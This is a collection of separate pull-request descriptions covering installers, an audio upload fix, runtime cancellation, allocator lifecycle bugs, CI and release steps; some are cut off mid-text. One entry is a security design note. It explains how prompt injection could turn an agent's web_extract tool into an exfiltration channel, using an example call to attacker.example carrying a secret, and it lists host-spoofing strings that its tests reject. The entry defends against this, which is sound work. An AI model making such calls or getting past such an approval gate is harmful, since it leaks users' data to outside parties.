author: emqnuele
body:
## What this changes

The first ten minutes of owning this project: `install.sh` / `install.ps1`,
`bea --setup`, `bea --doctor`, and the first start after them. Six commits, one
area — the install path — because the parts of it that were wrong were wrong
*together*.

**The menus are driven with the arrow keys.** `src/setup/keys.py` decodes one
keypress on the three platforms she installs on (escape sequences on
macOS/Linux, the two-byte scancodes on Windows); `src/setup/tui.py` draws a
live menu on top of it — one highlighted row, the hint of whatever is
highlighted, a footer saying which keys do something. Single choice, multiple
choice (the platform skills are one screen now instead of five yes/no
questions), and a yes/no you move between.

Every widget falls back to the numbered prompt it replaced wherever there is no
keyboard to read: a pipe, CI, the docker setup container, `BEA_NO_TUI=1`. The
number keys still pick an option, too. Nothing here needs a terminal to finish,
and scripted setup keeps working exactly as it did.

**The wordmark.** A 5x5 bitmap font in `src/setup/banner.py`, drawn along the
dashboard's accent gradient, in front of the wizard and the doctor. It degrades
twice on purpose: a console that cannot print a block character draws the same
letters in `#`, and a window narrower than the art gets the name on one line. The
two installers duplicate the art (they run before Python exists on the machine)
and a test compares theirs against the font so the two cannot drift.

**The whisper weights were downloaded twice.** This is the real bug behind "the
first start is unbelievably slow". `bea --setup` fetched them with
`download_model(output_dir=…)`, which lays the files out flat;
`WhisperModel(download_root=…)` passes the same folder as a Hugging Face
*cache*, which is a different layout. So a person who waited through 480MB in
the wizard waited through all of it again at her first startup, into a second
copy in the same folder, with nothing on screen to say why — and
`data/models/whisper` kept the dead copy forever. Both sides now go through one
function, `cache_dir` on both. That also removes the deprecated
`local_dir_use_symlinks` argument, which is where the `_validators.py:205`
warning came from.

`bea --doctor` gained a **Local weights** check: what is not downloaded yet, and
— for anyone who ran the old wizard — which loose files in `data/models/whisper`
are now dead, with their size.

**The progress bar stopped moving** because four libraries were drawing on the
same terminal: the hub's tqdm, fastembed's own tqdm (a bare `print`, which is
what the `Downloading bytes: ####` mess was) and the hub's symlink lecture,
through the middle of a rich live display. Downloads now run inside a `quiet()`
context that turns the others off and puts them back afterwards. The bar also
grows for the right reason now: the incomplete blobs land under the folder it
watches.

**The Hugging Face token is asked for, honestly.** Right before the downloads,
and only when there is something to download. It says what it is for — nothing
here needs an account, the weights are public, a token raises the rate limit and
makes this faster on a shared or office connection — and it is written to `.env`
*and* to this process, because the download two lines below is what reads it.

**`make` is no longer recommended by anything that runs before it exists.**
Windows does not ship it, and `make model` is not a useful thing to tell someone
whose install just finished. The wizard, the doctor and both installers now say
`uv run …`, and mention the `make` alias only as an afterthought for people who
have it.

**Feedback where there was none.** The first start announces the download it is
about to do (size, folder, "this happens once") and reports it every ten percent
while the model builder pulls it — without downloading anything itself, so
nothing changed about who fetches what. `bea` also says which part it is loading
before each slow one, and the windows symlink warning is off by default
(`setdefault`, so setting it to `0` brings it back).

**`curl … | bash` could not answer its own questions.** Piped from curl the
script *is* that shell's standard input, so the wizard was reading the rest of
the installer instead of an answer. It now runs the wizard on `/dev/tty` when
stdin is not a terminal, and says so plainly when there is no terminal at all.

**The wordmark is one colour** — one bright ink, which is the one thing every
terminal theme renders the same way. Under it, a byline: `by emqnuele`, the
project site and the portfolio. The dashboard's sidebar carries the same three
links under the version line, and both of them read the URLs from one module
(`src/web/frontend/src/lib/links.js` on the front end, `banner.py` on the back)
so a moved docs site is one edit rather than five. A test asserts the installers
and the dashboard still point at the same places.

## What breaks if it is wrong

Someone's first ten minutes with the project, which is the only ten minutes most
people give it.

The two failure modes worth watching:

- **A menu that cannot be answered.** Every widget takes an injected key source,
  which is how the tests drive it, and refuses to draw a live display unless the
  console is a terminal *and* the keyboard can be read. If that check is ever
  wrong, the fallback is the prompt that was there before. Both paths are
  tested, and both were run end to end through a pty and through a pipe.
- **A cache probe that lies.** `weights_here` and the engine's loader now call
  the same function with the same arguments, and there is a test asserting the
  call carries `cache_dir` and neither `output_dir` nor
  `local_dir_use_symlinks`. If they ever diverge again, that test is the one
  that fails.

Nothing about the engine changed. No new dependency: the menus are ~250 lines
over `termios`/`msvcrt` and rich, which is already a dependency.

One thing this does **not** fix: people who ran the old wizard have a dead copy
of the weights in `data/models/whisper`. Deleting files on someone's disk is not
this program's business, so the doctor names them and their size instead.

## Checks

- [x] `make test` passes (`uv run pytest -q` — 1591 passed, 77 of them new)
- [x] `npm test` in `src/web/frontend` passes (19, 4 of them new), and the dashboard builds
- [x] `make lint` passes (`uv run ruff check src tests`)
- [x] `uvx pyright` — 0 errors, as CI runs it
- [x] New behaviour has a test named after the behaviour
- [x] `docs/` updated (`docs/setup.md`, `docs/configuration.md`, `README.md`, `.env.example`)

Verified by hand as well as by the suite: the wizard driven through a real pty
with the arrow keys, the same wizard driven through a pipe with `BEA_NO_TUI=1`
(both write `.env` and `config.json` and exit 0), and `bea --doctor`.
`install.ps1` has not been run — there is no Windows machine here — so the
PowerShell half is read-and-reasoned, not executed.

author: vpulim
body:
`web_extract` fetched any public URL the agent named. Under prompt injection —
which is the normal condition on this surface, not the exotic one — that is an
exfiltration channel: `web_extract('https://attacker.example/?x=<secret>')` hands
data to a third party that plainly sees the request, and it cannot be taken back.

It shipped classified as `spends`, because `PolicyRule.effect` held one value and
a tool cannot be two things at once in a field with room for one. So the outward
half went undeclared, and an undeclared outward effect is one the lint cannot
refuse to `allow`.

This closes both halves.

## What it does now

```
web_extract(url):
  private / internal    -> deny    (url-guard.ts, unchanged, underneath)
  host on the allowlist -> allow   (silent)
  anything else         -> hold    (approving remembers that host, for that person)
```

The allowlist ships **empty**, and that is safe only because a miss is a **hold,
not a refusal**. Nothing breaks on a fresh install: the first read of a new site
asks once, and the list earns silence over time. Please don't "fix" the empty
default by seeding it with something permissive — the gate is the feature.

Attacking the channel rather than adding a prompt was the point. A prompt on
every page read is a prompt people learn to click through, which buys nothing and
costs the gate its credibility.

## Scope is `global | user`. There is deliberately no `agent` tier.

It reuses the shape of `CredentialScope` (`'global' | 'user' | 'agent'`) minus
the agent tier, and the omission is the security decision rather than a
simplification to tidy up later. TASK-257 partitions agent state on `agentId`
alone, so a team agent's storage is shared by every teammate who can reach it. An
agent-scoped entry would mean **one teammate's approval silently granting
outbound reach to everyone else using that agent** — privilege escalation behind
a UI that looks like a personal decision. `global` (an operator curates it) and
`user` (the person who answered) are the only two scopes where the approver and
the beneficiary are the same party.

That is enforced by SHAPE, not by a check: `egress-allowlist:remember` takes
`{ host }` and derives the owner from `ctx.userId`. There is no owner field on
the payload for anybody to pass somebody else's id into, and no bus hook writes a
`global` entry at all — those are seeded from the preset's config at init.

## `PolicyRule.effect` is a set now

`effect: ToolEffect` → `effect: ToolEffect[]`, and `web_extract` declares
`['spends', 'outward']`. Both are true; the single-value field forced a choice
between two true things, and that forced choice is exactly how this shipped as
`spends` with the outward surface undisclosed.

`lintRuleEffect` reads the set with **strictest member wins** — an `outward`
anywhere forces `hold` or `deny`, whatever else sits beside it. The two plausible
wrong readings are both wrong in the same direction: "the first member decides"
makes the constraint depend on authoring order, and "the majority decides" lets a
second `spends` outvote the exfiltration channel. There is a fixture for each.

The rail carries the **whole** set. Carrying only the strictest member would stop
telling anybody the call costs money; carrying only the first would drop the
outward disclosure, which is the direction design H4 forbids.

## Where the allowlist lives, and where it deliberately does not

In `@ax/tool-policy`. It already owns "what may this call do", is already in
`presets/k8s` with a canary and manifest assertions, and the rule and the
allowlist are one concept — invariant 4.

**Not** in `@ax/host-grants`, even though `host_grants_v1_grants` already stores
hostnames. That is the *sandbox* egress allowlist: the chat orchestrator unions it
into the MITM proxy at session open, so an entry there lets the agent open a raw
socket to the host. Folding `web_extract` into it would mean approving one page
read ALSO opened sockets to that host — a strictly larger grant than the person
answered for — and it carries the agent axis this card rules out.

**Not** `@ax/credential-proxy`'s `allowedHosts` either: those are declared by a
skill, for the hosts that skill needs. `web_extract` is a built-in and belongs to
no skill, so there was nothing there to reuse. Hence a new config surface.

## How a host gets onto a person's list

`@ax/web-tools` calls `egress-allowlist:remember` after a **successful** fetch.
`tool:execute:web_extract` is the one choke point every permitted path converges
on — a silent allow, a warm agent re-issuing after a consumed approval, and the
host replaying an approval from the Today queue — so recording there records
exactly what policy already permitted.

`@ax/decisions` fires nothing on approval (`decisions:executed` was deleted by
TASK-279 for being subscribed by nobody) and its one fire-and-forget event
deliberately omits `call.input`. Adding an approval event carrying model-authored
input to the most safety-critical plugin in the repo would have been a large
change in the wrong direction. `tool:post-call` was the other candidate and does
not fire on the host-replay path, so an approval answered from the queue would
never have been remembered.

Failing to record is the **safe** direction throughout: every early return and
every catch costs one extra approval next time and grants nothing.

## Boundary review — `egress-allowlist:remember`

- **Alternate impl:** a corporate egress-proxy control plane, or a per-tenant
  policy backend that records permitted destinations centrally instead of in our
  table. Same two-field surface either way.
- **Payload field names that might leak:** none. `host` is neutral network
  vocabulary — no `sha`, no `bucket`, no `pod_name`, nothing that only makes
  sense against a SQL table.
- **Subscriber risk:** it is a service hook with one caller, and it answers a
  bare `{ remembered: boolean }`. There is no backend-specific field for anybody
  to key off.
- **Wire surface:** none. It is deliberately NOT an IPC action. The only dynamic
  service lookup reachable from a sandbox is `tool:execute:${call.name}` in
  `tool-execute-host.ts`, whose fixed prefix cannot address this hook.

## Security review

- **Sandbox:** NARROWS an existing capability rather than adding one —
  `web_extract`'s reachable destinations go from "any public host" to "any public
  host, but the first read of each is held for a person". The new hook
  (`egress-allowlist:remember`) writes one validated hostname under `ctx.userId`,
  carries no owner field, is unreachable from the sandbox (not an IPC action; the
  only dynamic lookup is prefixed `tool:execute:`), and refuses the `'system'`
  sentinel so an init context cannot own an entry. No filesystem paths, no
  process spawn, no env access, no handles cross any boundary.
- **Injection:** `call.input.url` is model-authored and is the untrusted string
  throughout. It reaches exactly three places — `new URL(...).hostname` for an
  exact `Set` membership test in `evaluate` (pure, total, never throws, since a
  throw inside a `tool:pre-call` subscriber is swallowed by `HookBus.fire` as a
  CLEAN PASS); `normalizeHost` into a **parameterized** Kysely insert, never
  string-concatenated SQL; and nowhere else. It never reaches prose (`templates.ts`
  still never sees `call.input`) and never reaches a log — both the existing
  guard error and the new warning name the validated hostname only, because a
  query string can carry a token. Host matching is EXACT: not a prefix
  (`good.example.com.evil.test`), not a suffix (`evil.good.example.com`), not a
  path or query (`evil.test/?to=good.example.com`), not userinfo
  (`good.example.com@evil.test`), and IDNA means a unicode homograph arrives as
  punycode and cannot collide. Each has a test.
- **Supply chain:** no new third-party packages. `@ax/tool-policy` gains `kysely`
  at `0.28.17` — **exact, not a range**, matching the pin `@ax/decisions` and
  `@ax/host-grants` already us

author: bahaabzns
body:
## Summary
- A coach reported client-portal voice notes were unplayable; their screenshot showed a native "Error" state in the `<audio>` player on an iOS Safari client (production, `fitsavior-com.fitforce.app`).
- Root cause: `multer-s3`'s `AUTO_CONTENT_TYPE` byte-sniffs uploads via the bundled `file-type@3` library, whose generic MP4 `ftyp`-box signature check runs before its `audio/m4a` brand check. Safari's `MediaRecorder` audio-only MP4 output collides with that generic signature, so the recording was stored in R2 with `Content-Type: video/mp4` — which Safari's `<audio>` element refuses to play. The coach messenger and client portal share the exact same upload/playback code, so this affected both surfaces, but was effectively client-visible only since clients skew mobile Safari and coaches use desktop.
- Fix: for the messenger/portal attachment uploader only, trust the browser-declared mimetype (set by our own `useVoiceRecorder` hook from the real `MediaRecorder` output) for audio uploads instead of byte-sniffing. Every other attachment kind (images, files) and every other uploader in the app (photos, transactions, training assets) keeps the existing sniff-based resolution, unchanged.
- Logged a related-but-out-of-scope issue to `DEBT.md`: the outgoing voice-note filename is still hardcoded to `.webm` regardless of the actual recorded codec.

This PR targets `main` directly (not via `dev`) because `dev` has diverged substantially from `main` since 2026-07-10 and is stale — this commit was cherry-picked from the original `dev`-merged fix (`c16f998`) onto current `main`, reconciled to preserve `main`'s existing `storage.ts`/`messageAttachments.ts` code (`putBuffer`, the `ALLOWED_ATTACHMENT_EXTS` export) that `dev` doesn't have.

## Test plan
- [x] `tests/unit/messageAttachments.test.ts` (new) — reproduces the underlying `file-type` misclassification, verifies audio uploads now bypass it, verifies non-audio attachments still byte-sniff unchanged
- [x] Full unit suite against `main`: 111/111 passing
- [x] `tests/integration/messenger.test.ts` against `main`: passing
- [x] `tsc --noEmit`: no new errors in touched files
- [x] Manual confirmation on a real iOS Safari device (verified against the original `dev`-based fix before this cherry-pick)

author: tristanlawrenceguy
body:
The old correction path used `claimedMissing` to detect only one non-existent URL per assistant reply, meaning a model that names several phantom pages gets corrected for the first one only and delivers a broken response. Replacing it with `VerifyClaims` scans every `/t/<type>/<id>` URL in the reply against the store and lists all missing ones in a single correction message, giving the model full context to fix everything in one tool call.

Three low-severity notes are left for follow-up: `claimedMissing` is now dead code (the reviewer flagged it as separate cleanup), the error return from `VerifyClaims` is silently discarded on the caller side (safe today but worth explicit handling later), and there is no standalone unit test directly exercising `VerifyClaims` against an in-memory store (covered indirectly by the integration test).

author: thevangelist
body: `scaleType` asked whether any single observed value divided by 8, so one stray multiple was enough to label a page an 8px system and most sites reported 8px regardless of their real rhythm. It is now the share of spacing declarations that land on the step, weighted by occurrence, at a 60% threshold; two large public sites with 20% and 3% of their spacing on the 8 grid both flip from 8px to custom. `commonValues[].rem` also divided by a hardcoded 16 instead of the document root font size. Both move values for an unchanged site, so SCHEMA_VERSION goes to 1.14.0. `extractSpacing` had no test coverage and now has a browser fixture.

author: fiunchinho
body:
## What

Drops the golden-side hold on the data plane's metric labels in `tests/verify-target.py`, the same way #501 dropped the `klausGateway.crd` hold.

## Why

`make verify-target` fails on a pristine `main`:

```
Error: values don't meet the specifications of the schema(s) in the following chart(s):
agent-platform:
- at '/llmRouting': additional properties 'metricLabels' not allowed
```

#528 moved the labels from `llmRouting.metricLabels` to `gateway.metricLabels` and held each side at its own key while `GOLDEN_REF` still carried the old one. `GOLDEN_REF` is `origin/main`, which now carries #528: `llmRouting.metricLabels` is gone from its schema, so nulling it is refused and the render never runs. The comment on the hold already said to drop it once `GOLDEN_REF` carried the move.

Both sides now declare `gateway.metricLabels` with the same defaults, so neither hold is needed: the renders match with the labels in place, which is a stronger comparison than the one the hold made.

`main`'s own `test-ingress-modes` has been red since #528 ([build 9324](https://circleci.com/gh/giantswarm/agent-platform/9324)), and every branch inherits it.

## Verified

- `make verify-target` passes (it fails on `main` without this).
- `make verify-metric-labels` and `make verify-modes` pass, the golden render unchanged.
- `pre-commit run --all-files` clean.

JIRA: [SHAPE-11631](https://storyblok.atlassian.net/browse/SHAPE-11631)

> **Stacked on #42.** GitHub retargets to `main` as the stack merges.

## What

Move only the field-plugin CI **`check`** job (`lint` + `format:check` + template `build`/`test:types` + `manifest-helper` test) to `runs-on: ubuntu-slim`. The **`cli-smoke`** job stays on `ubuntu-latest`.

## Why

`ubuntu-slim` is the org runner for lightweight jobs (storyfront/storyrails use it for PR-title/permission checks, gates, `commitlint`-style work). The `check` job is a small workload over a small subtree, so it fits. `cli-smoke` keeps `ubuntu-latest` because it runs `npm install` of full framework apps across an 8-leg matrix — too heavy for slim.

Follows #36–#42 in the SHAPE-11631 sequence.

body:
Release cut for `3.4.0-alpha.78`.

The release bump was run locally with the repository tooling against `v3-ai` at `472eb97520`:

- `standard-version --release-as 3.4.0-alpha.78` bumps the root plus the 21 configured package manifests (`.versionrc.js`) and writes the CHANGELOG section `v3.4.0-alpha.77...v3.4.0-alpha.78`.
- `--release-as` is required because `package.json` is at `3.4.0-alpha.76` while the highest tag is the hand-cut `v3.4.0-alpha.77`; the default bump would propose `alpha.77` and collide with the existing tag.
- Annotated tag `v3.4.0-alpha.78` points at the release commit `841bda4ceb`.

Pushing the tag already fired the 15 `v3_*-prd.yml` image builds (no GitHub Release, as expected for an alpha tag). This PR only lands the release commit on `v3-ai` so the tag points at a commit on the branch; it does not change deploy values or run migrations.

No PRD deployment: `deploy/env-uzh-prd/values.yaml` still pins `v3.4.0-alpha.77` (except `mcp-student`/`mcp-lecturer` at `v3.4.0-alpha.61`). Promoting PRD to `alpha.78` is a separate authorized step.

author: bojiang-li
body:
## Summary

A bidirectional request can be cancelled while its engine retains the input stream without reading it. Once the eight-item decoded-input channel fills, the ingress forwarder blocks in `frame_tx.send(item).await`; its context check before decoding is no longer reached. The task retains the pending decoded item and raw request receiver until the engine drops or drains its input.

Keep one `stopped()` future per forwarder and poll it while sending a decoded item. In this context, `stopped()` also resolves on Kill. Cancellation exits the forwarder and drops its pending item and transport receiver, while items already queued in the engine-owned input remain under that owner's control. Normal input ordering and EOF behavior are unchanged.

The regression test uses the public ingress payload-adapter API, a real process-local distributed runtime, PushRouter, and TCP request/callback sockets. The engine holds its input; the adapter signals when the ninth item is decoded and attaches a drop notice to that item. Eight items fill the input queue, so the ninth must wait. After cancellation reaches the worker context, the test requires that pending item to be released before the engine drops its input. It covers healthy nine-item draining, Kill, and Stop in one Tokio test runtime so the process-global TCP accept loop remains alive. There are no production test hooks or sleeps to guess the blocked state.

This is independent of #15003, which fixes the lower TCP request-reader buffer. Here only nine items are sent, so the raw request stream can already finish while the decoded-item forwarder remains blocked. #14918 addresses the separate response pump's `stream.next()` wait; this PR does not duplicate that change. A local 128-frame lifecycle experiment also confirmed the distinction between the reader, input forwarder, engine-owned input, and response pump.

## Validation

- On unmodified main, the new end-to-end test reports healthy drain **true**, but pending-item release before consumer drop **false** for both Kill and Stop, then fails its final assertion. Fixture cleanup completes before that assertion.
- With this patch, healthy drain, Kill, and Stop all pass; the existing `bidirectional_end_to_end_echo` also passes.
- `cargo test -p dynamo-runtime --test bidirectional_input_cancellation --test bidirectional_e2e -- --nocapture`: **2 tests passed**, with explicit loopback hosts and an OS-assigned callback port.
- `cargo test -p dynamo-runtime --lib pipeline::network::ingress -- --test-threads=1 --nocapture`: **23 passed**.
- `cargo clippy -p dynamo-runtime --lib --tests -- -D warnings -A unused-variables`: passed. The allowance is for the existing macOS `join_reuseport` parameter in `quic_response.rs`.
- Changed-file pre-commit and `git diff --check`: passed.

AI-assisted investigation and implementation. CPU validation on macOS; no GPU-resource-release or production latency claim. The local lifecycle instrumentation and the combined #15001/#15003 research patches are not included in this PR.

author: scttfrdmn
body:
RegisterDefaultPlugins spelled a PluginConfig out per registration, and fifteen
of the sixty-seven left Options["time_controller"] out. The fallback every
plugin takes for an absent key is a private NewTimeController(time.Now()) and
it is silent by design, so a registration that forgot the key looked exactly
like one that supplied it — and eleven services stamped their timestamps from
the wall clock, ignoring both the time control endpoints and the clock a replay
sets per event.

The config is now built in one place, pluginWiring.register, and the
registrations are a table of {plugin, name, extra} in the original order with
the original error-wrap names. A registration can no longer spell its own
config out, which is what made the omission invisible at each call site.

A nil *TimeController is left out of the map rather than stored: every plugin
reads the value with a type assertion that succeeds for a typed nil and would
hand the plugin a clock that panics on first use, where an absent key takes the
documented fallback instead.

Kinesis needed a second fix. generateKinesisSeqNo called time.Now() from a
function with no receiver, so it could not reach any plugin's clock however
that clock was supplied — and a SequenceNumber is observable, reported by
PutRecord and PutRecords and echoed back by GetRecords. It now takes the
instant as a parameter and both call sites pass the plugin's clock.

The new test asserts exact equality against a stopped clock for each of the
eleven plugins whose registration used to omit it, through the server rather
than through a hand-initialized plugin, plus that POST /v1/control/time reaches
two of them. All eleven fail against the parent commit. The four remaining
registrations of the fifteen — Tagging, Health, Price List and the API Gateway
proxy — have no clock field at all, so the option is a deliberate no-op there.

#886's workaround, which re-registered SES v2 by hand with the server's clock
in order to assert a whole MessageId, is deleted.

Closes #904.

## Verification

The nine-command gate is clean: `gofmt`/`go build`/`go vet`, `golangci-lint run ./...`, `make test`, `GOTOOLCHAIN=go1.26.6 make test`, `GOTOOLCHAIN=go1.26.6 make coverage`, the four docs targets, `npm --prefix docs run build`, and the e2e suite. Coverage holds the baseline at **85.0% emulator / 84.5% total**.

The premise corrections behind this change are recorded on the issue: only eleven of the fifteen have a clock field at all, the Kinesis bypass, the three uncounted callers of `RegisterDefaultPlugins` (including the debug UI, whose zero-time clock the eleven now inherit), and why AC 4 is answered by central wiring rather than by making `Initialize` fail.

author: seokwoosong
body:
<!-- Thank you for your contribution! Please follow these guidelines to enhance your pull request. -->

## Motivation

Unified-memory allocators can relocate FLOAT pages while a disaggregation move gate is closed, return stale schedulable capacity after the gate changes, or lose pending source pages when multiple move batches share one forward-completion event. These can violate movement restrictions, mislead admission, or prevent completed source pages from returning to the free list.

This patch fixes these three lifecycle defects in the upstream unified-memory allocator.

## Modifications

- Honor the movement gate in FLOAT `make_room` and `compact_holes`. A closed gate still permits reporting already-open space, but no relocation.
- Recompute gate-dependent schedulable capacity when a dynamic peer gate exists, because the gate can change without an allocator epoch change. Ungated views retain their memoization.
- Accumulate all pending source batches for the same completion event so draining the event returns every source page for reuse.
- Add regression tests for movement restrictions, capacity reporting across gate transitions, and reclamation of source pages from batches sharing a completion event.

The production change is confined to `unified_sub_pool.py`. It reports capacity usable under the current movement restrictions; it does not add a scheduler policy to defer requests until a gate reopens.

## Accuracy Tests

This patch passed the selected CPU/Rust regressions and controlled CUDA gate/capacity and lifecycle checks.

In the supplementary Qwen3.5-4B GSM8K sanity check, the baseline and patched versions each scored **180/200 (90.0%) in both runs**, with identical correct/incorrect question sets and no request errors.

<details>
<summary>Correctness validation, accuracy runs, and limitations</summary>

At the tested patch revision `9dc2c91895`, the selected CPU regression lane passed **260 tests and 1,530 subtests**, with **10 GPU-only skips**. The Rust lane passed **5 tests and 39 subtests** with the expected prebuilt extension loaded. Direct execution of the three new registered regression files also passed (3 FLOAT gate, 4 capacity, and 1 pending-event test).

Additional CUDA validation at the tested patch revision:

- Gate/capacity matrix: **36 process runs (18 per arm)** across FULL+Mamba, FULL+SWA, and three-pool layouts; page sizes 1/16; three repeats; baseline and patched versions. All invariant checks passed. The baseline's 36 gate-transition sequences reproduced stale capacity; all 36 patched sequences matched fresh queries.
- FLOAT gate: no copies or allocator snapshot changes while closed; reopening moved four retained SWA pages and preserved payloads.
- Controlled FULL-owner same-event helpers: **6 normal passes** across the three layouts, plus **3 injected-overwrite controls** that detected a missing completed source. Normal cases verified both source pages' ordered reclamation, physical reuse, and retained/reader/new payloads.

A controlled FULL+Mamba case demonstrates the eviction trade-off: with demand 15, the closed-gate baseline reported 31 although fresh capacity was 14 and allocation failed. The patched allocator reported 14, evicted one FULL token and one state slot, and allocated successfully. Opening the gate before the call allowed both versions to allocate without eviction.

**Serving sanity check:** full Qwen3.5-4B checkpoint, fixed 200 GSM8K questions (rows 5–204), five examples, repository prompt/last-number grader, native token-ID requests, temperature 0, concurrency 4, maximum 2,048 generated tokens. Four fresh runs in baseline/patched/patched/baseline order:

| Run | Correct | Request errors | Length-limited outputs |
|---|---:|---:|---:|
| Baseline 1 | 180/200 (90.0%) | 0 | 0 |
| Patched 1 | 180/200 (90.0%) | 0 | 1 |
| Patched 2 | 180/200 (90.0%) | 0 | 0 |
| Baseline 2 | 180/200 (90.0%) | 0 | 0 |

The correct/incorrect question sets matched across all four runs. Exact output-sequence matches were 164/200 and 178/200 between versions, versus 171/200 for each same-version repeat.

**Limitations:** One patched output reached the 2,048-token limit and was graded correct by the last-number grader. The score does not establish that every answer fully completed, exact output equivalence, or general task accuracy. Same-version output variability does not establish whether the patch caused cross-version differences.

The controlled eviction example is not a live PD scheduler measurement or evidence of workload-wide eviction overhead. Existing coarse reclaim remains outside this patch: prior matched eager/lazy controls retained 0/96 cached tokens for demand 4 in both versions.

GPT-OSS-20B was retried with a **600-second total first-request deadline**: baseline startup took 23.6 seconds, but the first request failed after 45.7 seconds with a FlashInfer API error (`cutlass_fused_moe`: unexpected `use_fused_finalize`). Granite-Swash-2B fallback could not start because the installed Transformers did not recognize `granite_swa`. Neither model is included in serving accuracy/speed results. The installed packages and production sources remained unchanged during these measurements.

The CUDA helpers do not establish natural production-flush reachability, distributed PD/RDMA safety, or full three-pool model serving. FULL+SWA has allocator CUDA coverage but no successful serving comparison in this environment.

</details>

## Speed Tests and Profiling

**CPU capacity queries:** Eight baseline/patched pairs measured the following host costs. One sweep queries every pool in the layout; these are allocator timings, not model generation timings.

| Layout | No gate, baseline → patched (µs/sweep) | Open gate, baseline → patched (µs/sweep) |
|---|---:|---:|
| FULL+Mamba | 0.278 → 0.435 | 0.276 → 2.776 |
| FULL+SWA | 0.278 → 0.432 | 0.281 → 2.770 |
| FULL+SWA+Mamba | 0.483 → 1.314 | 0.483 → 4.256 |

**Supplementary Qwen3.5-4B serving:** Scenario-level paired throughput changes ranged from **−0.49% to +0.77%**. All **22 runs × 128 measured requests** completed without errors at the prescribed token lengths. The observed CPU query overhead remains a cost of the patch.

<details>
<summary>Serving results and setup</summary>

RTX 5090 (32 GB); baseline `a1b4ec02ae` versus patched `9dc2c91895`. Both use unified memory, BF16, Triton backends, page size 1, overlap/lazy compaction enabled, and CUDA graphs disabled. Context length is 8192, maximum KV tokens 16384, chunked prefill 512, and Mamba cache cap 32. Request-pool capacity is 6, including at client concurrency 16.

Each fresh-server run used 16 warmup requests, a cache flush, and 128 measured requests with identical workloads between versions and EOS ignored. The first condition used six fixed pairs. Each remaining condition used one baseline/patched pair, with one reverse-order repeat allowed if the predefined absolute-change thresholds were exceeded: >3% throughput, >5% median TTFT/TPOT, or >10% p95 TTFT/TPOT/E2E. None of the five remaining conditions triggered a repeat.

| Client concurrency | Input/output tokens | Baseline tokens/s | Patched tokens/s | Paired change |
|---|---|---:|---:|---:|
| 1 | 512/128 | 104.53 | 105.14 | +0.28% |
| 1 | 2048/128 | 95.75 | 96.44 | +0.72% |
| 4 | 512/128 | 382.00 | 384.93 | +0.77% |
| 4 | 2048/128 | 297.25 | 295.80 | −0.49% |
| 16 | 512/128 | 534.31 | 532.35 | −0.37% |
| 16 | 2048/128 | 335.37 | 335.93 | +0.17% |

Throughput is output tokens/s; the first row reports per-arm medians and the median paired change. These limited observations do not establish performance equivalence or precise tail latency. Ungated Qwen serving does not measure live PD gate transitions, waiting-versus-eviction policy, or graph-enabled performance.

</details>

- [x] Format your code according to the [Format code with pre-commit](https://docs.sglang.io/developer

author: mergify[bot]
body:
## Proposed commit message

```
[sync-changelog] Assign sync PR to the backport PR author or merger

When creating the changelog sync PR, resolve the assignee from the
originating backport PR: use the PR author if they are an elastic org
member, otherwise fall back to whoever merged the PR. If the lookup
fails for any reason, the --assignee flag is omitted so PR creation
is not blocked.

[sync-changelog] Always load action and binary from main

Replace the local ./.github/actions/sync-backport-changelog reference
with elastic/integrations/.github/actions/sync-backport-changelog@main
in both the push and issue_comment jobs, so the action definition is
always fetched from main regardless of which backport branch triggered
the run.

Add an explicit checkout of main inside the action so the Go binary is
also always built from main's cmd/backport, not from a potentially
older backport branch.

[sync-changelog] Use bot flag and write access to resolve sync PR assignee

Replace the elastic org membership check (which required read:org scope
not available on GITHUB_TOKEN) with a collaborator permission check via
GET /repos/{repo}/collaborators/{login}/permission, which works with the
existing contents:write + pull-requests:write permissions.

Introduce prActor{Login, IsBot} parsed directly from the gh pr view JSON
so bot detection uses the API's own is_bot flag rather than string
matching. pickAssignee now guards both the author and mergedBy paths:
- Use author if not a bot and has write/maintain/admin access.
- Fall back to mergedBy if not a bot.
- Return empty string (skip --assignee) if neither qualifies.
```

## What and Why

**Assignee on sync PRs** (`cmd/backport/backports/changelog/sync.go`)

Changelog sync PRs created by the `sync-backport-changelog` workflow had no assignee set, leaving them unowned. This change resolves the assignee automatically from the originating backport PR using the following logic:

1. Fetch the backport PR's `author` and `mergedBy` (including `is_bot` flag) in a single `gh pr view` call.
2. Use the author if they are not a bot and have write/maintain/admin access on the repo, checked via `GET /repos/{repo}/collaborators/{login}/permission` (works with the existing `contents:write` + `pull-requests:write` `GITHUB_TOKEN` permissions).
3. Otherwise fall back to `mergedBy`, as long as they are not a bot (the merger always has repo write access by definition).
4. If neither qualifies (e.g. both are bots), omit `--assignee` so PR creation is not blocked.

**Always run from main** (`.github/workflows/sync-backport-changelog.yml`, `.github/actions/sync-backport-changelog/action.yml`)

Previously the workflow loaded the composite action from the branch that triggered it (`./.github/actions/sync-backport-changelog`). Improvements merged to `main` would not apply to pushes on existing backport branches. This change:

- Switches both jobs (`push` and `issue_comment`) to reference `elastic/integrations/.github/actions/sync-backport-changelog@main`.
- Adds an explicit `actions/checkout@v7` with `ref: main` inside the action so the Go binary is also always built from `main`'s `cmd/backport`.
- Removes the now-redundant `actions/checkout` steps from the workflow (the action does its own checkout).

## Author's Checklist

- [ ] `pickAssignee` is covered by unit tests (`TestPickAssignee`) including bot-author, external-contributor, and both-bots scenarios.
- [ ] Verified behaviour against real PRs #21002 and #21127 — correct assignees resolved in both cases.

## How to test this PR locally

1. Merge a PR into a backport branch that has a `changelog.yml` change.
2. Observe that the `sync-backport-changelog` workflow creates a sync PR with the correct assignee (the PR author if not a bot and has repo write access, otherwise the merger if not a bot).
3. Alternatively, comment `/sync-changelog` on a merged backport PR to trigger the retry path and verify the same.

## Related issues

- Relates #19262
- Follows up https://github.com/elastic/integrations/issues/19215

body:
## Summary

* Shared one `ISampleDataApi` process-wide, as cpp's `WiffFile2` does, so a `.wiff2` open no longer leaks a `SampleDataProviderServer` the SDK gives no way to shut down
* Counted readers per SDK path so only the last one out calls `CloseFile`, which is what keeps a sibling reader from seeing its pooled storage location purged mid-request
* Added a finalizer, so a reader dropped without `Dispose` cannot strand that count and make `CloseFile` unreachable for the path
* Removed `IsAbWiff2Safe` / `ExtAbWiff2Safe` and the four mzML fallbacks from #4659, so the nightly leak pass reads real `.wiff2` again - which is also what keeps this from regressing

Measured on `TestInstrumentInfo` in the leak pass: managed memory went from a linear ~37 KB per iteration (22.47 -> 23.28 MB over 22 iterations, no plateau) to flat at 22.56 MB from iteration 5, converging early instead of climbing.

Stacked on #4670, which carries the concurrency tests this fix has to satisfy. Retarget to `Skyline/work/20260612_net8_port` once that merges.

Fixes #4674

## Test plan

